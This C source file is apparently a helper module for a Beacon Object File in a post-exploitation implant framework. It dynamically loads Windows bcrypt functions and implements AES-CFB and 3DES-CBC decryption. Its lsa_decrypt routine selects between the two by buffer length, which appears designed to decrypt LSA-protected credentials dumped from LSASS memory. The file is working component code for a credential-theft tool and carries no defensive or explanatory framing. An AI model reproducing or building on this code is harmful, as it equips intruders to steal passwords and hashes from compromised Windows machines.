#include "../include/common_bof.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

typedef LONG (WINAPI* pBCryptOpenAlgorithmProvider)(PVOID*,LPCWSTR,LPCWSTR,ULONG);
typedef LONG (WINAPI* pBCryptSetProperty)(PVOID,LPCWSTR,PUCHAR,ULONG,ULONG);
typedef LONG (WINAPI* pBCryptGetProperty)(PVOID,LPCWSTR,PUCHAR,ULONG,PULONG,ULONG);
typedef LONG (WINAPI* pBCryptGenerateSymmetricKey)(PVOID,PVOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
typedef LONG (WINAPI* pBCryptDecrypt)(PVOID,PUCHAR,ULONG,PVOID,PUCHAR,ULONG,PUCHAR,ULONG,PULONG,ULONG);
typedef LONG (WINAPI* pBCryptDestroyKey)(PVOID);
typedef LONG (WINAPI* pBCryptCloseAlgorithmProvider)(PVOID,ULONG);

typedef struct {
    pBCryptOpenAlgorithmProvider  OpenAlg;
    pBCryptSetProperty            SetProp;
    pBCryptGetProperty            GetProp;
    pBCryptGenerateSymmetricKey   GenKey;
    pBCryptDecrypt                Decrypt;
    pBCryptDestroyKey             DestroyKey;
    pBCryptCloseAlgorithmProvider CloseAlg;
} BcryptApi;

static BOOL load_bcrypt(BcryptApi* api) {
    HMODULE h = KERNEL32$LoadLibraryA("bcrypt.dll");
    if (!h) return FALSE;
    api->OpenAlg    = (pBCryptOpenAlgorithmProvider) KERNEL32$GetProcAddress(h, "BCryptOpenAlgorithmProvider");
    api->SetProp    = (pBCryptSetProperty)            KERNEL32$GetProcAddress(h, "BCryptSetProperty");
    api->GetProp    = (pBCryptGetProperty)            KERNEL32$GetProcAddress(h, "BCryptGetProperty");
    api->GenKey     = (pBCryptGenerateSymmetricKey)   KERNEL32$GetProcAddress(h, "BCryptGenerateSymmetricKey");
    api->Decrypt    = (pBCryptDecrypt)                KERNEL32$GetProcAddress(h, "BCryptDecrypt");
    api->DestroyKey = (pBCryptDestroyKey)             KERNEL32$GetProcAddress(h, "BCryptDestroyKey");
    api->CloseAlg   = (pBCryptCloseAlgorithmProvider) KERNEL32$GetProcAddress(h, "BCryptCloseAlgorithmProvider");
    return api->OpenAlg && api->Decrypt;
}

static const wchar_t MODE_CBC[]    = L"ChainingModeCBC";
static const wchar_t MODE_CFB[]    = L"ChainingModeCFB";
static const wchar_t PROP_MODE[]   = L"ChainingMode";
static const wchar_t PROP_MSGLEN[] = L"MessageBlockLength";
static const wchar_t PROP_OBJLEN[] = L"ObjectLength";

ByteBuf aes_cfb128_decrypt(const uint8_t* ct, size_t ct_len,
                            const uint8_t* key, const uint8_t* iv) {
    ByteBuf empty = {0};
    BcryptApi api;
    if (!load_bcrypt(&api)) return empty;

    void* alg = NULL;
    void* bkey = NULL;
    if (api.OpenAlg(&alg, L"AES", NULL, 0) != 0) return empty;
    api.SetProp(alg, PROP_MODE, (PUCHAR)MODE_CFB,
                (ULONG)(16 * sizeof(wchar_t)), 0);
    ULONG fb = 16;
    api.SetProp(alg, PROP_MSGLEN, (PUCHAR)&fb, sizeof(ULONG), 0);

    ULONG obj_sz = 0, dummy = 0;
    api.GetProp(alg, PROP_OBJLEN, (PUCHAR)&obj_sz, sizeof(ULONG), &dummy, 0);
    if (!obj_sz) obj_sz = 512;
    uint8_t* obj = (uint8_t*)BOF_ALLOC(obj_sz);
    if (!obj) { api.CloseAlg(alg, 0); return empty; }

    if (api.GenKey(alg, &bkey, obj, obj_sz, (PUCHAR)key, 16, 0) != 0) {
        BOF_FREE(obj); api.CloseAlg(alg, 0); return empty;
    }

    ByteBuf out = bb_alloc(ct_len);
    uint8_t iv_copy[16];
    memcpy(iv_copy, iv, 16);
    ULONG rlen = 0;
    LONG r = api.Decrypt(bkey, (PUCHAR)ct, (ULONG)ct_len, NULL,
                         iv_copy, 16, out.data, (ULONG)ct_len, &rlen, 0);
    api.DestroyKey(bkey);
    BOF_FREE(obj);
    api.CloseAlg(alg, 0);
    if (r != 0) { bb_free(&out); return empty; }
    out.len = rlen;
    return out;
}

ByteBuf des3_cbc_decrypt(const uint8_t* ct, size_t ct_len,
                          const uint8_t* key24, const uint8_t* iv8) {
    ByteBuf empty = {0};
    BcryptApi api;
    if (!load_bcrypt(&api)) return empty;

    void* alg = NULL;
    void* bkey = NULL;
    if (api.OpenAlg(&alg, L"3DES", NULL, 0) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCrypt OpenAlg 3DES failed\n");
        return empty;
    }
    LONG r = api.SetProp(alg, PROP_MODE, (PUCHAR)MODE_CBC,
                         (ULONG)(16 * sizeof(wchar_t)), 0);
    if (r != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCrypt SetProp failed: %ld\n", r);
        api.CloseAlg(alg, 0); return empty;
    }

    ULONG obj_sz = 0, dummy = 0;
    api.GetProp(alg, PROP_OBJLEN, (PUCHAR)&obj_sz, sizeof(ULONG), &dummy, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "  3DES obj_sz=%lu\n", obj_sz);
    if (!obj_sz) obj_sz = 512;
    uint8_t* obj = (uint8_t*)BOF_ALLOC(obj_sz);
    if (!obj) { api.CloseAlg(alg, 0); return empty; }

    r = api.GenKey(alg, &bkey, obj, obj_sz, (PUCHAR)key24, 24, 0);
    if (r != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCrypt GenKey failed: %ld\n", r);
        BOF_FREE(obj); api.CloseAlg(alg, 0); return empty;
    }

    ByteBuf out = bb_alloc(ct_len);
    uint8_t iv_copy[8];
    memcpy(iv_copy, iv8, 8);
    ULONG rlen = 0;
    r = api.Decrypt(bkey, (PUCHAR)ct, (ULONG)ct_len, NULL,
                    iv_copy, 8, out.data, (ULONG)ct_len, &rlen, 0);
    if (r != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCrypt Decrypt failed: %ld\n", r);
    }
    api.DestroyKey(bkey);
    BOF_FREE(obj);
    api.CloseAlg(alg, 0);
    if (r != 0) { bb_free(&out); return empty; }
    out.len = rlen;
    return out;
}

ByteBuf lsa_decrypt(const uint8_t* enc, size_t enc_len,
                    const uint8_t* aes_key, size_t aes_len,
                    const uint8_t* des_key, size_t des_len,
                    const uint8_t* iv,      size_t iv_len) {
    ByteBuf empty = {0};
    if (!enc || !enc_len) return empty;
    if (enc_len % 8 != 0) {
        return aes_cfb128_decrypt(enc, enc_len, aes_key, iv);
    } else {
        uint8_t iv8[8] = {0};
        memcpy(iv8, iv, iv_len < 8 ? iv_len : 8);
        return des3_cbc_decrypt(enc, enc_len, des_key, iv8);
    }
}
